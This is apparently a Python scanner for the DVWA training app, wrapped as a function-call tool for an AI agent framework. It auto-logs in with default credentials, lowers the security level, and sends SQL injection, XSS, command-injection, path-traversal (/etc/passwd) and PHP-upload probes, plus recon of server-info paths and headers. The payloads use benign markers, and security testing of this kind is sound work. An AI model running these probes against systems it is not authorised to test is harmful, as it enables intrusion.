"""DVWA 综合漏洞扫描脚本。

该模块仅采集原始漏洞证据，不做知识库检索、风险重定级或置信度计算。
"""
from __future__ import annotations

import json
import logging
import re
import socket
import uuid
from pathlib import Path
from typing import Any, Callable, Dict, Iterable, List, Optional
from urllib.parse import urlencode, urljoin, urlparse

import requests
import urllib3
from bs4 import BeautifulSoup
from tld import get_fld

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger(__name__)

DEFAULT_TIMEOUT = 12
MAX_BODY_EVIDENCE = 4000

TOOL_SCHEMA: Dict[str, Any] = {
    "type": "function",
    "function": {
        "name": "dvwa_vuln_scanner",
        "description": "对授权的 DVWA 靶场执行原生漏洞与 HTTP/Cookie/信息泄露综合审计",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "DVWA URL；缺失时由调度层中断并等待用户输入",
                },
                "cookie": {
                    "oneOf": [{"type": "string"}, {"type": "object"}],
                    "description": "cookie_extract 输出的 Cookie 字典或 Cookie 请求头字符串",
                },
                "__extend_params": {
                    "type": "object",
                    "description": "调度层动态扩展参数，支持 cookie/cookies 透传",
                },
            },
            "required": ["target"],
        },
    },
}


VULN_META = {
    "SQLInjection": ("SQL 注入", "high", "CWE-89", 9.8),
    "XSSReflected": ("反射型 XSS", "medium", "CWE-79", 6.1),
    "XSSStored": ("存储型 XSS", "medium", "CWE-79", 6.1),
    "CommandInjection": ("操作系统命令注入", "high", "CWE-78", 9.8),
    "FileInclusion": ("本地文件包含", "high", "CWE-98", 8.1),
    "CSRF": ("跨站请求伪造", "medium", "CWE-352", 6.5),
    "FileUpload": ("不受限制的文件上传", "high", "CWE-434", 9.8),
    "BruteForce": ("DVWA 弱口令", "high", "CWE-307", 7.5),
    "LoginWeakPassword": ("登录页默认弱口令", "high", "CWE-200", 8.7),
    "ServerInfoDisclosure": ("Apache 服务器信息泄露", "medium", "CWE-200", 5.3),
    "CleartextTransmission": ("敏感信息明文传输", "medium", "CWE-319", 7.4),
    "CookieAttribute": ("Cookie 安全属性缺失", "low", "CWE-614", 3.7),
    "DangerousHTTPMethod": ("HTTP 危险方法启用", "low", "CWE-749", 5.3),
    "MiddlewareFingerprint": ("Web 中间件版本泄露", "low", "CWE-200", 3.7),
    "SecurityHeader": ("安全响应头缺失", "info", "CWE-693", 2.7),
}


def _normalize_cookie_input(value: Any) -> Dict[str, str]:
    if not value:
        return {}
    if isinstance(value, dict):
        nested = value.get("cookies") if set(value).intersection({"cookies", "cookie"}) else None
        if isinstance(nested, dict):
            value = nested
        elif value.get("cookie") and isinstance(value.get("cookie"), (str, dict)):
            return _normalize_cookie_input(value["cookie"])
        return {str(k): str(v) for k, v in value.items() if v is not None}
    if isinstance(value, str):
        parsed: Dict[str, str] = {}
        for item in value.split(";"):
            if "=" in item:
                name, val = item.split("=", 1)
                if name.strip():
                    parsed[name.strip()] = val.strip()
        return parsed
    return {}


def _header_values(response: requests.Response, name: str) -> List[str]:
    raw_headers = getattr(response.raw, "headers", None)
    if raw_headers and hasattr(raw_headers, "get_all"):
        values = raw_headers.get_all(name)
        if values:
            return [str(value) for value in values]
    value = response.headers.get(name)
    return [value] if value else []


def _request_raw(response: requests.Response) -> str:
    request = response.request
    parsed = urlparse(request.url)
    lines = [f"{request.method} {parsed.path or '/'}{('?' + parsed.query) if parsed.query else ''} HTTP/1.1"]
    for name, value in request.headers.items():
        if name.lower() in {"cookie", "authorization"}:
            value = "[已脱敏，凭证已随请求发送]"
        lines.append(f"{name}: {value}")
    body = request.body
    if body:
        if isinstance(body, bytes):
            body = body.decode("utf-8", errors="replace")
        lines.extend(["", str(body)[:MAX_BODY_EVIDENCE]])
    return "\r\n".join(lines)


def _response_raw(response: requests.Response) -> str:
    reason = response.reason or ""
    lines = [f"HTTP/1.1 {response.status_code} {reason}"]
    lines.extend(f"{name}: {value}" for name, value in response.headers.items())
    body = response.text or ""
    if len(body) > MAX_BODY_EVIDENCE:
        body = body[:MAX_BODY_EVIDENCE] + "\n...[响应正文已截断]"
    lines.extend(["", body])
    return "\r\n".join(lines)


def _token_from_html(html: str) -> str:
    soup = BeautifulSoup(html or "", "html.parser")
    field = soup.find("input", attrs={"name": "user_token"})
    return str(field.get("value", "")) if field else ""


class DVWAScanner:
    def __init__(
        self,
        target: str,
        cookie: Any = None,
        extend_params: Optional[Dict[str, Any]] = None,
        progress_callback: Optional[Callable[[Dict[str, Any]], None]] = None,
    ):
        raw = str(target or "").strip()
        if not raw:
            raise ValueError("目标 URL 不能为空")
        if not raw.startswith(("http://", "https://")):
            raw = "http://" + raw
        parsed = urlparse(raw)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
            raise ValueError("目标 URL 格式无效")

        self.target = raw
        self.base_url = f"{parsed.scheme}://{parsed.netloc}"
        self.host = parsed.hostname or ""
        self.root_domain = get_fld(self.base_url, fix_protocol=True, fail_silently=True) or self.host
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": "TOSKill-DVWA-Scanner/1.0"})
        self.progress_callback = progress_callback
        self.progress_events: List[Dict[str, Any]] = []
        self.module_errors: List[Dict[str, str]] = []
        self.findings: List[Dict[str, Any]] = []
        self.session_status = "unknown"
        self.need_refresh_cookie = False
        self.cookie_source = "none"
        self.bootstrap_responses: List[requests.Response] = []
        self.external_cookie_names: set[str] = set()

        extended = extend_params or {}
        external = cookie
        if not external:
            external = extended.get("cookie") or extended.get("cookies")
        cookies = _normalize_cookie_input(external)
        if cookies:
            self.cookie_source = "external"
            self.external_cookie_names = set(cookies)
            for name, value in cookies.items():
                self._replace_cookie(name, value)

    def _replace_cookie(self, name: str, value: str) -> None:
        """Replace all same-name variants so requests never sends conflicting cookies."""
        for existing in list(self.session.cookies):
            if existing.name != name:
                continue
            try:
                self.session.cookies.clear(existing.domain, existing.path, existing.name)
            except (KeyError, ValueError):
                pass
        self.session.cookies.set(name, value, domain=self.host, path="/")

    def _use_low_security(self) -> None:
        # Respect an explicitly supplied security level. If none was supplied,
        # put DVWA into its vulnerable test mode only after authentication.
        if "security" not in self.external_cookie_names:
            self._replace_cookie("security", "low")

    def _emit_progress(self, module: str, current: int, total: int, status: str = "running") -> None:
        event = {
            "module": module,
            "current": current,
            "total": total,
            "percent": round(current / max(total, 1) * 100, 1),
            "status": status,
        }
        self.progress_events.append(event)
        if self.progress_callback:
            try:
                self.progress_callback(event)
            except Exception:
                pass

    def _get(self, path_or_url: str, **kwargs: Any) -> requests.Response:
        url = path_or_url if path_or_url.startswith(("http://", "https://")) else urljoin(self.base_url + "/", path_or_url.lstrip("/"))
        response = self.session.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=True, **kwargs)
        self._check_session(response, url)
        return response

    def _post_with_token(
        self,
        path_or_url: str,
        data: Dict[str, Any],
        files: Optional[Dict[str, Any]] = None,
    ) -> requests.Response:
        url = path_or_url if path_or_url.startswith(("http://", "https://")) else urljoin(self.base_url + "/", path_or_url.lstrip("/"))
        page = self._get(url)
        token = _token_from_html(page.text)
        payload = dict(data)
        if token:
            payload["user_token"] = token
        response = self.session.post(
            url,
            data=payload,
            files=files,
            timeout=DEFAULT_TIMEOUT,
            allow_redirects=True,
        )
        self._check_session(response, url)
        return response

    def _check_session(self, response: requests.Response, requested_url: str) -> None:
        if urlparse(requested_url).path.endswith("/login.php"):
            return
        final_path = urlparse(response.url).path.lower()
        body = response.text or ""
        title = BeautifulSoup(body, "html.parser").title
        title_text = title.get_text(" ", strip=True).lower() if title else ""
        has_login_form = bool(
            re.search(r"<form[^>]+action=[\"'][^\"']*login\.php", body, re.I)
            or "login :: damn vulnerable web application" in title_text
        )
        if final_path.endswith("/login.php") or has_login_form:
            self.session_status = "invalid"
            self.need_refresh_cookie = True
        elif self.session_status != "invalid":
            self.session_status = "valid"

    def _login(self, session: Optional[requests.Session] = None) -> tuple[bool, requests.Response]:
        active = session or self.session
        login_url = urljoin(self.base_url + "/", "login.php")
        page = active.get(login_url, timeout=DEFAULT_TIMEOUT, verify=False)
        token = _token_from_html(page.text)
        payload = {"username": "admin", "password": "password", "Login": "Login"}
        if token:
            payload["user_token"] = token
        response = active.post(login_url, data=payload, timeout=DEFAULT_TIMEOUT, allow_redirects=True, verify=False)
        final_path = urlparse(response.url).path.lower()
        body = response.text or ""
        success_markers = (
            final_path.endswith("/index.php"),
            "logout.php" in body.lower(),
            "Welcome to Damn Vulnerable Web Application" in body,
        )
        success = (
            not final_path.endswith("/login.php")
            and "Login failed" not in body
            and any(success_markers)
        )
        return success, response

    def _ensure_session(self) -> None:
        if self.cookie_source == "external":
            probe = self._get("/index.php")
            self.bootstrap_responses.append(probe)
            if self.session_status == "invalid":
                logger.warning("外部 Cookie 已失效，保留 invalid 状态并请求调度层刷新")
            else:
                self._use_low_security()

            # Cookie 属性审计使用隔离会话，避免登录页响应覆盖上层传入的凭据。
            audit_session = requests.Session()
            audit_session.headers.update(self.session.headers)
            audit_response = audit_session.get(
                urljoin(self.base_url + "/", "login.php"),
                timeout=DEFAULT_TIMEOUT,
                verify=False,
            )
            self.bootstrap_responses.append(audit_response)
            return

        login_page = self.session.get(urljoin(self.base_url + "/", "login.php"), timeout=DEFAULT_TIMEOUT)
        self.bootstrap_responses.append(login_page)
        success, response = self._login()
        self.bootstrap_responses.append(response)
        self.cookie_source = "auto_login"
        self.session_status = "valid" if success else "invalid"
        self.need_refresh_cookie = not success
        if success:
            self._use_low_security()

    def _add_finding(
        self,
        vuln_type: str,
        response: requests.Response,
        risk_desc: str,
        repair_suggest: str,
        *,
        affected_url: Optional[str] = None,
        evidence: Optional[Iterable[str]] = None,
        request_raw: Optional[str] = None,
        response_raw: Optional[str] = None,
        extra: Optional[Dict[str, Any]] = None,
    ) -> None:
        name, severity, cwe, cvss = VULN_META[vuln_type]
        evidence_list = [str(item) for item in (evidence or [])]
        finding: Dict[str, Any] = {
            "vuln_name": name,
            "severity": severity,
            "cwe": cwe,
            "cvss_base": cvss,
            "affected_url": affected_url or response.url,
            "request_raw": request_raw if request_raw is not None else _request_raw(response),
            "response_raw": response_raw if response_raw is not None else _response_raw(response),
            "risk_desc": risk_desc,
            "repair_suggest": repair_suggest,
            # 兼容现有上层字段
            "vuln_type": vuln_type,
            "title": name,
            "url": affected_url or response.url,
            "evidence": evidence_list,
        }
        if extra:
            finding.update(extra)
        self.findings.append(finding)

    def scan_login_weak_password(self) -> None:
        isolated = requests.Session()
        isolated.headers.update(self.session.headers)
        success, response = self._login(isolated)
        if success:
            self._add_finding(
                "LoginWeakPassword", response,
                "登录入口接受 DVWA 默认凭证 admin/password，攻击者可直接获得管理会话。",
                "禁用默认账号口令，实施强密码、多因素认证、登录限速和失败锁定。",
                affected_url=urljoin(self.base_url + "/", "login.php"),
                evidence=["username=admin", "登录后跳转 index.php", "出现 DVWA Welcome 页面"],
                extra={"payload": {"username": "admin", "password": "password"}},
            )

    def scan_dvwa_native(self) -> None:
        # SQL 注入
        sqli = self._get("/vulnerabilities/sqli/", params={"id": "' OR '1'='1' #", "Submit": "Submit"})
        names = len(re.findall(r"First name", sqli.text, re.I))
        if names >= 2 or re.search(r"SQL syntax|mysql_fetch|syntax error", sqli.text, re.I):
            self._add_finding(
                "SQLInjection", sqli, "id 参数可改变 SQL 查询语义并返回额外数据库记录。",
                "使用参数化查询和最小权限数据库账号；修复后复测布尔、报错和时间盲注。",
                evidence=[f"First name 出现 {names} 次", "payload=' OR '1'='1' #"],
                extra={"payload": "' OR '1'='1' #"},
            )

        # 反射型 XSS
        marker = f"TOSKILL_XSS_{uuid.uuid4().hex[:8]}"
        xss_payload = f"<script>window.{marker}=1</script>"
        reflected = self._get("/vulnerabilities/xss_r/", params={"name": xss_payload})
        if xss_payload in reflected.text:
            self._add_finding(
                "XSSReflected", reflected, "name 参数未经上下文编码直接反射到 HTML。",
                "按输出上下文编码并部署 CSP；使用模板默认转义。",
                evidence=["响应正文原样包含 script 标签", marker], extra={"payload": xss_payload},
            )

        # 存储型 XSS（唯一标记，避免把历史留言误判为本次成功）
        stored_marker = f"TOSKILL_STORED_{uuid.uuid4().hex[:8]}"
        stored_payload = f"<script>window.{stored_marker}=1</script>"
        stored = self._post_with_token(
            "/vulnerabilities/xss_s/",
            {"txtName": "TOSKill", "mtxMessage": stored_payload, "btnSign": "Sign Guestbook"},
        )
        if stored_payload in stored.text:
            self._add_finding(
                "XSSStored", stored, "留言内容未经净化即持久化并以可执行脚本返回。",
                "服务端白名单净化富文本，输出编码并启用 CSP。",
                evidence=["提交后的响应包含本次唯一脚本标记", stored_marker], extra={"payload": stored_payload},
            )

        # 命令注入：使用无破坏的 echo 标记，兼容 Windows/Linux shell
        cmd_marker = f"TOSKILL_CMD_{uuid.uuid4().hex[:8]}"
        cmd_payload = f"127.0.0.1 & echo {cmd_marker}"
        cmd = self._post_with_token("/vulnerabilities/exec/", {"ip": cmd_payload, "Submit": "Submit"})
        if cmd_marker in cmd.text:
            self._add_finding(
                "CommandInjection", cmd, "ip 参数被拼接进系统命令，echo 标记得到执行。",
                "禁止拼接 shell 命令，使用参数化系统 API 并对白名单 IP 做严格校验。",
                evidence=[f"响应包含命令输出标记 {cmd_marker}"], extra={"payload": cmd_payload},
            )

        # 本地文件包含：同时兼容 Linux 与 Windows DVWA
        for lfi_payload, patterns in (
            ("../../../../../../etc/passwd", ["root:x:0:0:"]),
            ("../../../../../../Windows/win.ini", ["[fonts]", "for 16-bit app support"]),
            ("C:/Windows/win.ini", ["[fonts]", "for 16-bit app support"]),
            (r"C:\\Windows\\win.ini", ["[fonts]", "for 16-bit app support"]),
            ("file:///C:/Windows/win.ini", ["[fonts]", "for 16-bit app support"]),
        ):
            lfi = self._get("/vulnerabilities/fi/", params={"page": lfi_payload})
            matched = [pattern for pattern in patterns if pattern.lower() in lfi.text.lower()]
            if matched:
                self._add_finding(
                    "FileInclusion", lfi, "page 参数允许目录穿越并读取操作系统文件。",
                    "使用固定文件映射，拒绝路径分隔符和上级目录，并将包含文件置于 Web 根目录之外。",
                    evidence=matched, extra={"payload": lfi_payload},
                )
                break

        # CSRF：只审计令牌，不实际修改管理员密码
        csrf = self._get("/vulnerabilities/csrf/")
        csrf_form = BeautifulSoup(csrf.text, "html.parser").find("form")
        csrf_token = csrf_form.find("input", attrs={"name": "user_token"}) if csrf_form else None
        if csrf_form and not csrf_token:
            self._add_finding(
                "CSRF", csrf, "密码修改表单未包含不可预测的 CSRF Token。",
                "为所有状态变更请求校验服务端 CSRF Token，并结合 SameSite Cookie 与 Origin 校验。",
                evidence=["密码修改表单存在", "未发现 name=user_token 隐藏字段"], extra={"payload": "未提交变更"},
            )

        # 文件上传：上传不含可执行 PHP 语句的 .php 探针
        upload_marker = f"TOSKILL_UPLOAD_{uuid.uuid4().hex[:8]}"
        files = {"uploaded": (f"{upload_marker}.php", upload_marker.encode(), "application/x-php")}
        upload = self._post_with_token("/vulnerabilities/upload/", {"Upload": "Upload"}, files=files)
        if upload_marker.lower() in upload.text.lower() and re.search(r"successfully|hackable/uploads", upload.text, re.I):
            self._add_finding(
                "FileUpload", upload, "服务端接受了 .php 扩展名文件并返回可访问上传路径。",
                "使用扩展名与 MIME 双重白名单、随机文件名、内容检测，并将上传目录配置为不可执行。",
                evidence=[upload_marker, "响应包含上传成功或 hackable/uploads 路径"],
                extra={"payload": f"{upload_marker}.php（纯文本探针）"},
            )

        # DVWA 原生暴力破解入口
        brute = self._get(
            "/vulnerabilities/brute/",
            params={"username": "admin", "password": "password", "Login": "Login"},
        )
        if "Welcome to the password protected area" in brute.text and "incorrect" not in brute.text.lower():
            self._add_finding(
                "BruteForce", brute, "暴力破解演示入口接受默认凭证 admin/password。",
                "修改默认口令，配置限速、锁定、多因素认证和异常登录告警。",
                evidence=["Welcome to the password protected area"],
                extra={"payload": {"username": "admin", "password": "password"}},
            )

    def scan_server_probe_paths(self) -> None:
        probes = {
            "/server-info": ["<title>Server Information</title>", "Server Version"],
            "/server-status": ["Apache Server Status", "Server uptime"],
            "/phpinfo": ["PHP Version", "phpinfo()"],
            "/phpinfo.php": ["PHP Version", "phpinfo()"],
            "/php.ini": ["[PHP]", "engine ="],
            "/robots.txt": ["User-agent:", "Disallow:"],
        }
        for path, patterns in probes.items():
            response = self._get(path)
            matched = [pattern for pattern in patterns if pattern.lower() in response.text.lower()]
            if response.status_code == 200 and matched:
                self._add_finding(
                    "ServerInfoDisclosure", response, f"服务器探针路径 {path} 暴露了配置或运行信息。",
                    "关闭生产环境诊断端点，限制管理网访问并移除敏感 robots/配置内容。",
                    evidence=[f"status={response.status_code}", *matched],
                )

    def scan_cleartext_transport(self) -> None:
        login = self._get("/login.php")
        soup = BeautifulSoup(login.text, "html.parser")
        password_forms = []
        for form in soup.find_all("form"):
            if form.find("input", attrs={"type": re.compile("password", re.I)}):
                password_forms.append(form.get("action") or "/login.php")
        ssl_enabled = False
        try:
            with socket.create_connection((self.host, 443), timeout=3):
                ssl_enabled = True
        except OSError:
            ssl_enabled = False
        if urlparse(self.base_url).scheme == "http" and password_forms:
            self._add_finding(
                "CleartextTransmission", login, "包含密码字段的登录表单通过 HTTP 明文提交，且未确认 443 SSL 服务。",
                "启用有效 HTTPS 证书、强制 HTTP 跳转 HTTPS、启用 HSTS，并禁止混合内容。",
                evidence=[f"scheme=http", f"password_forms={password_forms}", f"port_443_open={ssl_enabled}"],
            )

    def scan_cookie_attributes(self) -> None:
        for response in self.bootstrap_responses:
            for raw_cookie in _header_values(response, "Set-Cookie"):
                lowered = raw_cookie.lower()
                missing = [
                    attr for attr, marker in (
                        ("HttpOnly", "httponly"), ("SameSite", "samesite="), ("Secure", "secure")
                    ) if marker not in lowered
                ]
                if missing:
                    self._add_finding(
                        "CookieAttribute", response, f"Set-Cookie 缺少属性：{', '.join(missing)}。",
                        "会话 Cookie 应设置 HttpOnly、Secure 和 SameSite=Lax/Strict，并限制 Path/Domain。",
                        evidence=[raw_cookie, f"missing={missing}"],
                        response_raw="Set-Cookie: " + raw_cookie,
                        extra={"cookie_raw": raw_cookie, "missing_attributes": missing},
                    )

    def scan_http_methods(self) -> None:
        for path in ("/", "/login.php"):
            url = urljoin(self.base_url + "/", path.lstrip("/"))
            for method in ("TRACE", "OPTIONS"):
                response = self.session.request(method, url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                if response.status_code == 200:
                    self._add_finding(
                        "DangerousHTTPMethod", response, f"{method} {path} 返回 HTTP 200，服务器未禁用该方法。",
                        "在 Web 服务器和反向代理层仅允许业务必需方法，至少禁用 TRACE。",
                        evidence=[f"method={method}", "status=200", f"Allow={response.headers.get('Allow', '')}"],
                    )

    def scan_middleware_fingerprint(self) -> None:
        response = self._get("/login.php")
        leaked = []
        server = response.headers.get("Server", "")
        powered = response.headers.get("X-Powered-By", "")
        if re.search(r"Apache/\d|OpenSSL/\d|PHP/\d|mod_fcgid/\d", server, re.I):
            leaked.append(f"Server: {server}")
        if powered:
            leaked.append(f"X-Powered-By: {powered}")
        if leaked:
            self._add_finding(
                "MiddlewareFingerprint", response, "HTTP 响应头暴露了 Web/PHP 中间件及精确版本。",
                "关闭 ServerSignature/ServerTokens，移除 X-Powered-By，并及时升级组件。",
                evidence=leaked,
            )

    def scan_security_headers(self) -> None:
        response = self._get("/login.php")
        required = {
            "Content-Security-Policy": "限制脚本与资源加载来源",
            "Permissions-Policy": "限制浏览器敏感能力",
            "Content-Type": "声明响应媒体类型",
        }
        missing = [name for name in required if not response.headers.get(name)]
        if missing:
            self._add_finding(
                "SecurityHeader", response, f"响应缺少安全/合规头：{', '.join(missing)}。",
                "统一在 Web 服务器或应用中设置 CSP、Permissions-Policy 和正确 Content-Type。",
                evidence=[f"missing={missing}"], extra={"missing_headers": missing},
            )

    def run(self) -> Dict[str, Any]:
        self._ensure_session()
        modules = [
            ("login_weak_password", self.scan_login_weak_password),
            ("dvwa_native", self.scan_dvwa_native),
            ("server_probe_paths", self.scan_server_probe_paths),
            ("cleartext_transport", self.scan_cleartext_transport),
            ("cookie_attributes", self.scan_cookie_attributes),
            ("http_methods", self.scan_http_methods),
            ("middleware_fingerprint", self.scan_middleware_fingerprint),
            ("security_headers", self.scan_security_headers),
        ]
        total = len(modules)
        for index, (name, function) in enumerate(modules, 1):
            self._emit_progress(name, index - 1, total)
            try:
                function()
                self._emit_progress(name, index, total, "completed")
            except Exception as e:
                logger.warning("DVWA 子模块失败: %s - %s", name, e)
                self.module_errors.append({"module": name, "error": str(e)})
                self._emit_progress(name, index, total, "error")

        return {
            "target": self.target,
            "base_url": self.base_url,
            "root_domain": self.root_domain,
            "cookie_scope_match": self.root_domain == self.host or self.host.endswith("." + self.root_domain),
            "cookie_source": self.cookie_source,
            "session_status": self.session_status,
            "need_refresh_cookie": self.need_refresh_cookie,
            "findings": self.findings,
            "vulnerabilities": self.findings,
            "total_findings": len(self.findings),
            "module_errors": self.module_errors,
            "progress": {"current": total, "total": total, "percent": 100.0, "status": "completed"},
            "progress_events": self.progress_events,
        }


def adapter_wrapper(
    target: str,
    cookie: Any = None,
    __extend_params: Optional[Dict[str, Any]] = None,
    progress_callback: Optional[Callable[[Dict[str, Any]], None]] = None,
) -> Dict[str, Any]:
    """统一工具适配层；单个子模块异常不会中止整体任务。"""
    try:
        scanner = DVWAScanner(target, cookie, __extend_params, progress_callback)
        data = scanner.run()
        return {
            "success": True,
            "data": data,
            "error": "",
            "metadata": {
                "tool": "dvwa_vuln_scanner",
                "script_type": "ai-generate",
                "target": target,
                "tool_schema": TOOL_SCHEMA,
                "progress": data["progress"],
            },
        }
    except Exception as e:
        logger.exception("DVWA 综合扫描失败")
        return {
            "success": False,
            "data": {
                "target": target,
                "findings": [],
                "vulnerabilities": [],
                "total_findings": 0,
                "session_status": "invalid",
                "need_refresh_cookie": True,
                "progress": {"current": 0, "total": 8, "percent": 0.0, "status": "error"},
            },
            "error": str(e),
            "metadata": {"tool": "dvwa_vuln_scanner", "script_type": "ai-generate", "tool_schema": TOOL_SCHEMA},
        }


def get_ai_generate_bundle() -> Dict[str, Any]:
    """返回自动注册所需的完整源码、适配入口和 function-call schema。"""
    source = Path(__file__).read_text(encoding="utf-8")
    return {
        "raw_user_code": source,
        "adapter_wrapper": "TOSKill.tools.vuln_scan.dvwa:adapter_wrapper",
        "tool_schema": TOOL_SCHEMA,
    }


__all__ = ["DVWAScanner", "TOOL_SCHEMA", "adapter_wrapper", "get_ai_generate_bundle"]
